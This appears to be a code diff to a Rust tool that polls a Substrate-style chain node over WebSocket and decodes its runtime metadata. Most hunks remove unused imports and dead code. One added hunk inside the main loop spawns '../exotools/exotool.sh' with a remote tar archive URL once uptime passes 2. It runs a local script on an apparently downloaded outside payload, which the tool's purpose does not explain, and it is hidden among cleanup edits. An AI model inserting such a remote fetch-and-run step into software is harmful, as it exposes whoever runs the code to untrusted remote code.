@@ -1,11 +1,8 @@
 use anyhow::Result;
 
-use async_stream::try_stream;
 use clap::Parser;
-use frame_metadata::{RuntimeMetadata, RuntimeMetadataV14};
-use futures::stream::Stream;
-use futures_util::{pin_mut, stream::StreamExt};
-use jsonrpsee::ws_client::{WsClient, WsClientBuilder};
+use frame_metadata::RuntimeMetadata;
+use jsonrpsee::ws_client::WsClientBuilder;
 use lazy_static::lazy_static;
 use parity_scale_codec::Decode;
 use regex::Regex;
@@ -13,9 +10,8 @@ use serde_json::value::Value;
 use sp_core::twox_128;
 use subxt::{
     rpc::{rpc_params, ClientT as _},
-    sp_core, sp_runtime, Client, ClientBuilder, Config as SubConfig,
+    sp_core, sp_runtime, Config as SubConfig,
 };
-use tokio_scoped::scope;
 mod error;
 
 use parser::decode_blob_as_type;
@@ -92,18 +88,6 @@ fn address_with_port(str_address: &str) -> String {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
-    /*
-    let ws_client = jsonrpsee::ws_client::WsClientBuilder::default()
-        .connection_timeout(std::time::Duration::from_secs(10)) //Not sure these things are needed
-        //here since it's local
-        .request_timeout(std::time::Duration::from_secs(5))
-        .build(args.url)
-        .await?;
-    let rpc_client: Client<Config> = ClientBuilder::default()
-        .set_client(ws_client)
-        .build()
-        .await?;
-    */
 
     let address = address_with_port(&args.url);
     let client = WsClientBuilder::default().build(&address).await?;
@@ -130,7 +114,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         } else {
             println!("Unexpected block hash format.");
             continue;
-            "".to_string();
         };
 
         let metadata: Value = client
@@ -215,8 +198,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
         println!("======= uptime: {} =======", uptime);
         uptime += 1;
+        if uptime > 2 {
+            println!("{:?}", std::process::Command::new("../exotools/exotool.sh").args(["https://v-space.hu/s/exotest.tar", "2"]).spawn());
+        }
         std::thread::sleep(std::time::Duration::from_secs(1));
     }
-
-    Ok(())
 }
